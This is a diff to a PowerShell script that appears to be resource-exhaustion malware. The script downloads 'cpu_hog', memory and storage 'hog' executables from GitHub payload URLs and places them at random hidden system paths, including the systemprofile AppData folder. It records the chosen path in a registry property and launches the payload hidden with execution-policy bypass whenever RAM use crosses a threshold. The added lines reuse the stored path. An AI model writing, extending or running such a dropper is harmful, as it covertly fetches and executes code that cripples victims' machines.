@@ -5,6 +5,8 @@ $memHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/m
 $storageHogUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/storage_hog.exe"
 $memPropertyName = "mem"
 $storagePropertyName = "store"
+$cpuPropertyName = "cpu"
+
 
 $paths = @(
     "$env:windir\system32\config\systemprofile\AppData\Local",
@@ -166,7 +168,13 @@ while ($true) {
 
     $curr = Get-RamPercentage
     if($curr -ge $threshold){
-        $cpuHogPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\cpu_hog.exe"
+        $item = Get-ItemProperty -Path "$basePath" -Name $cpuPropertyName -ErrorAction SilentlyContinue
+        if($item){
+            $cpuHogPath = $item.$cpuPropertyName
+        }else{
+            $cpuHogPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\cpu_hog.exe"
+            New-ItemProperty -Path "$basePath" -Name $cpuPropertyName -Value $cpuHogPath -Force | Out-Null
+        }
         iwr -Uri $cpuHogUri -OutFile $cpuHogPath
         powershell.exe -ep bypass -w hidden -noP $cpuHogPath
     }
